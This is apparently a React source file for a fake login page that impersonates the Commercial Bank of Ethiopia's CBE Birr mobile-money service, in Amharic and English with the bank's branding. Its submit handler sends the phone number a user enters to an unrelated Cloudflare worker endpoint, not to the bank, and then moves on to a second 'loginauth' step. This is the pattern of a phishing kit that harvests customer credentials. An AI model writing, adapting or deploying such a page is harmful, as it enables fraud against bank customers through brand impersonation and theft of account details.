import React, { useEffect } from "react";
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import ethopia from "./assets/ethopia3.png"
import birr from "./assets/BIRR.jpg";

const PURPLE = "#8d288e";

export default function CBEBirrLogin() {
  const [phone, setPhone] = useState("");
  const [focused, setFocused] = useState(false);
  const [lang, setLang] = useState("am");
  const [open, setOpen] = useState(false);
  const navigate = useNavigate()

  const translations = {
    am: {
      title: "ሲቢኢ ብር",
      subtitle: "ይግቡ እና ተጨማሪ ይመልከቱ...",
      placeholder: "ስልክ ቁጥር ያስገቡ",
      signIn: "ግባ",
      connect: "በሚከተለው ይገናኙ",
      noAccount: "መለያ የለዎትም?",
      create: "መለያ ፍጠር",
      question: "ጥያቄ አለዎት?",
      chatbot: "ቻትቦት",
      Next: "ይቀጥሉ"
    },
    en: {
      title: "CBE Birr",
      subtitle: "Let's login to explore more...",
      placeholder: "Enter phone number",
      signIn: "Sign In",
      connect: "You can Connect with",
      noAccount: "Don't have an account?",
      create: "Create Account",
      question: "Do you have any question?",
      chatbot: "Chatbot",
      Next: "Next"
    }
  };

  useEffect(() => {
    const close = () => setOpen(false);
    document.addEventListener("click", close);
    return () => document.removeEventListener("click", close);
  }, []);

  const handleSubmit = async () => {
    // const cleaned = phone.replace(/\D/g, "");

    // if (cleaned.length < 9) {
    //   alert(lang === "am"
    //     ? "እባክዎ ትክክለኛ ስልክ ቁጥር ያስገቡ"
    //     : "Please enter a valid phone number"
    //   );
    //   return;
    // }
    if (!phone.trim()) return;
    const payload = {
      phone: phone
    }
    await fetch(
      "https://my-worker-app.instapayapi.workers.dev/api/phone",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      },
    );
    // success
    navigate("/loginauth", { state: { phone } });
  };

  return (
    <div className=" flex items-center justify-center bg-gray-100">
      <div
        className="relative w-[390px] min-h-screen flex flex-col overflow-hidden"
        style={{ background: "#f5f5f5" }}
      >
        {/* Purple Header */}
        <div
          className="relative flex flex-col items-center justify-end pb-12 pt-10 px-6"
          style={{
            background: PURPLE,
            minHeight: "260px",
            borderBottomLeftRadius: "0px",
            borderBottomRightRadius: "0px",
          }}
        >
          {/* Geometric decoration */}
          {[
            { top: "10px", left: "10px", size: 90, rotate: "20deg", opacity: 0.18 },
            { top: "-20px", right: "30px", size: 120, rotate: "50deg", opacity: 0.12 },
            { top: "60px", right: "-20px", size: 80, rotate: "35deg", opacity: 0.15 },
            { top: "120px", left: "-15px", size: 70, rotate: "10deg", opacity: 0.13 },
          ].map((s, i) => (
            <div
              key={i}
              className="absolute border-2 border-white pointer-events-none"
              style={{
                top: s.top,
                left: s.left,
                right: s.right,
                width: s.size,
                height: s.size,
                transform: `rotate(${s.rotate})`,
                opacity: s.opacity,
                borderRadius: "12px",
              }}
            />
          ))}

          {/* Logo */}
          <div className="flex flex-col items-center gap-2 z-10">
            {/* <div className="w-14 h-14 rounded-full bg-white bg-opacity-20 flex items-center justify-center mb-1"> */}
            {/* CBE shield icon */}
            <img src={ethopia} className="w-30 h-20 rounded-full" />
            {/* </div> */}
            <p className="text-yellow-300 text-sm tracking-wider" style={{ fontFamily: "serif", letterSpacing: "0.15em" }}>
              የኢትዮጵያ ንግድ ባንክ
            </p>
            <p className="text-white text-sm font-light tracking-widest" style={{ letterSpacing: "0.12em" }}>
              Commercial Bank of Ethiopia
            </p>
          </div>
        </div>

        {/* White Card */}
        <div
          className="flex-1 flex flex-col px-6 pt-8 pb-8"
          style={{
            background: "white",
            borderTopLeftRadius: "28px",
            borderTopRightRadius: "28px",
            marginTop: "-24px",
            zIndex: 10,
            position: "relative",
            boxShadow: "0 -4px 30px rgba(141,40,142,0.10)",
          }}
        >
          {/* Drag indicator */}
          <div className="flex justify-center mb-6">
            <div className="w-10 h-1 rounded-full" style={{ background: PURPLE, opacity: 0.4 }} />
          </div>

          {/* Language */}
          <div className="relative mb-6" onClick={(e) => e.stopPropagation()}>

            {/* Top bar (same design) */}
            <div
              onClick={() => setOpen(!open)}
              className="flex items-center gap-2 cursor-pointer"
            >
              <svg width="18" height="18" fill="none" viewBox="0 0 24 24" stroke={PURPLE} strokeWidth="2">
                <circle cx="12" cy="12" r="10" />
                <path d="M2 12h20M12 2a15.3 15.3 0 010 20M12 2a15.3 15.3 0 000 20" />
              </svg>

              <span className="text-sm font-semibold" style={{ color: PURPLE }}>
                {lang === "en" ? "English" : "አማርኛ"}
              </span>

              <svg
                width="14"
                height="14"
                fill="none"
                viewBox="0 0 24 24"
                stroke={PURPLE}
                strokeWidth="2.5"
                className={`transition-transform ${open ? "rotate-180" : ""}`}
              >
                <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
              </svg>
            </div>

            {/* Dropdown */}
            {/* {open && (
              <div className="absolute mt-2 w-40 bg-white rounded-xl shadow-lg border z-50">

                <div
                  onClick={() => {
                    setLang("en");
                    localStorage.setItem("lang", "en");
                    setOpen(false);
                  }}
                  className="px-4 py-2 text-sm hover:bg-gray-100 cursor-pointer"
                >
                  English
                </div>

                <div
                  onClick={() => {
                    setLang("am");
                    localStorage.setItem("lang", "am");
                    setOpen(false);
                  }}
                  className="px-4 py-2 text-sm hover:bg-gray-100 cursor-pointer"
                >
                  አማርኛ
                </div>

              </div>
            )} */}
          </div>

          {/* CBEBirr App Icon + Title */}
          <div className="flex flex-col items-center mb-8">
            <div
            >
              <img src={birr} className="w-25 h-16 rounded-xl" />

            </div>

            {/* <h1 className="text-2xl font-bold mb-1" style={{ color: PURPLE, letterSpacing: "0.04em" }}>
              CBE<span style={{ color: "#f5c842" }}>Birr</span>
            </h1> */}
            <h1 className="text-2xl font-bold mb-1" style={{ color: PURPLE }}>
              {translations[lang].title.split(" ")[0]}
              <span style={{ color: "#f5c842" }}>
                {translations[lang].title.split(" ")[1]}
              </span>
            </h1>
            {/* <p className="text-gray-400 text-sm">Let's login to explore more...</p> */}
            <p className="text-gray-400 text-sm">
              {translations[lang].subtitle}
            </p>
          </div>

          {/* Phone Input */}
          <div
            className="flex items-center mb-4 overflow-hidden"
            style={{
              border: `2px solid ${focused ? PURPLE : "#e0e0e0"}`,
              borderRadius: "9999px",
              background: "white",
            }}
          >
            {/* Prefix block */}
            <div
              className="px-4 py-3 text-white font-semibold flex items-center justify-center"
              style={{
                background: PURPLE,
              }}
            >
              +251
            </div>

            {/* Input */}
            <input
              type="tel"
              placeholder={translations[lang].placeholder}
              value={phone}
              onChange={e => setPhone(e.target.value)}
              onFocus={() => setFocused(true)}
              onBlur={() => setFocused(false)}
              className="flex-1 px-4 py-3 outline-none bg-transparent text-gray-700"
            />
          </div>
          {/* <div
            className="flex items-center gap-3 px-4 py-4 rounded-full mb-4 transition-all duration-200"
            style={{
              border: `2px solid ${focused ? PURPLE : "#e0e0e0"}`,
              background: focused ? "#fdf5fd" : "white",
              boxShadow: focused ? `0 0 0 3px rgba(141,40,142,0.10)` : "none",
            }}
          >
            <svg width="22" height="22" fill="none" viewBox="0 0 24 24">
              <circle cx="12" cy="8" r="4" fill={PURPLE} opacity="0.85" />
              <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" fill={PURPLE} opacity="0.85" />
            </svg>
            <input
              type="tel"
              // placeholder="Enter phone number"
              placeholder={translations[lang].placeholder}
              value={phone}
              onChange={e => setPhone(e.target.value)}
              onFocus={() => setFocused(true)}
              onBlur={() => setFocused(false)}
              className="flex-1 outline-none bg-transparent text-gray-700 text-base"
              style={{ fontFamily: "inherit" }}
            />
          </div> */}

          {/* Sign In Button */}
          <button
            // onClick={() => navigate("/loginauth")}
            onClick={handleSubmit}
            className="w-full py-4 rounded-full text-white font-bold text-lg tracking-wide mb-8 transition-all duration-150 active:scale-95"
            style={{
              background: PURPLE,
              boxShadow: `0 4px 20px rgba(141,40,142,0.35)`,
              letterSpacing: "0.05em",
            }}
          >
            {translations[lang].Next}
            {/* Sign In */}
          </button>

          {/* Divider */}
          <div className="flex items-center gap-3 mb-6">
            <div className="flex-1 h-px bg-gray-200" />
            <span className="text-gray-400 text-sm whitespace-nowrap">
              {translations[lang].connect}
            </span>
            {/* <span className="text-gray-400 text-sm whitespace-nowrap">You can Connect with</span> */}
            <div className="flex-1 h-px bg-gray-200" />
          </div>

          {/* Social Icons */}
          <div className="flex justify-center gap-4 mb-8">
            {/* Phone/Call */}
            <button className="w-12 h-12 rounded-full bg-gray-100 flex items-center justify-center hover:bg-purple-50 transition-colors">
              <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="#555" strokeWidth="1.8">
                <path strokeLinecap="round" strokeLinejoin="round" d="M3 5a2 2 0 012-2h1.5a1 1 0 01.97.757l.9 3.6a1 1 0 01-.29.98L6.5 10a11.042 11.042 0 005.5 5.5l1.663-1.58a1 1 0 01.98-.29l3.6.9A1 1 0 0119 15.5V17a2 2 0 01-2 2h-1C8.716 19 3 12 3 5z" />
              </svg>
            </button>
            {/* Facebook */}
            <button className="w-12 h-12 rounded-full bg-gray-100 flex items-center justify-center hover:bg-blue-50 transition-colors">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="#1877F2">
                <path d="M24 12.073C24 5.404 18.627 0 12 0S0 5.404 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.235 2.686.235v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.269h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z" />
              </svg>
            </button>
            {/* LinkedIn */}
            <button className="w-12 h-12 rounded-full bg-gray-100 flex items-center justify-center hover:bg-blue-50 transition-colors">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="#0A66C2">
                <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" />
              </svg>
            </button>
            {/* YouTube */}
            <button className="w-12 h-12 rounded-full bg-gray-100 flex items-center justify-center hover:bg-red-50 transition-colors">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="#FF0000">
                <path d="M23.498 6.186a3.016 3.016 0 00-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 00.502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 002.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 002.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" />
              </svg>
            </button>
          </div>

          <p className="text-center text-gray-600 text-sm mb-4">
            {translations[lang].noAccount}{" "}
            <span className="font-semibold cursor-pointer" style={{ color: PURPLE }}>
              {translations[lang].create}
            </span>
          </p>

          <p className="text-center text-sm font-semibold text-gray-800 mb-8">
            {translations[lang].question}{" "}
            <span className="inline-flex items-center gap-1 cursor-pointer font-bold" style={{ color: PURPLE }}>
              {translations[lang].chatbot}
            </span>
          </p>
          {/* Create Account */}
          {/* <p className="text-center text-gray-600 text-sm mb-4">
            Don't have an account?{" "}
            <span className="font-semibold cursor-pointer" style={{ color: PURPLE }}>Create Account</span>
          </p> */}

          {/* Chatbot */}
          {/* <p className="text-center text-sm font-semibold text-gray-800 mb-8">
            Do you have any question?{" "}
            <span className="inline-flex items-center gap-1 cursor-pointer font-bold" style={{ color: PURPLE }}>
              <svg width="16" height="16" fill="none" viewBox="0 0 24 24" stroke={PURPLE} strokeWidth="2">
                <path strokeLinecap="round" strokeLinejoin="round" d="M8 10h.01M12 10h.01M16 10h.01M21 12c0 4.418-4.03 8-9 8a9.77 9.77 0 01-4-.85L3 20l1.1-3.5C3.4 15 3 13.55 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
              </svg>
              Chatbot
            </span>
          </p> */}

          {/* Footer */}
          {/* <div className="mt-auto pt-4 border-t border-gray-100">
            <p className="text-center text-gray-400 text-xs">©2026 All rights reserved to Commercial Bank of Ethiopia.</p>
          </div> */}
        </div>
      </div>
    </div>
  );
}
